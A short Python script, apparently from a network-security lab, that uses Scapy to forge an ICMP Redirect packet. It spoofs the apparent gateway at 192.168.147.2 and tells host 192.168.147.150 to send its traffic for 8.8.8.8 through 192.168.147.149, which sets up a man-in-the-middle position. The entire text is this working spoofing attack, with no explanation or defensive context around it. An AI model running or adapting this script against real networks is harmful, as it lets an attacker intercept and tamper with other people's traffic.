from scapy.all import *

ip = IP(src="192.168.147.2", dst="192.168.147.150")
icmp = ICMP(type=5, code=1)
icmp.gw = "192.168.147.149"

ip2 = IP(src="192.168.147.150", dst="8.8.8.8")
send(ip/icmp/ip2/UDP())
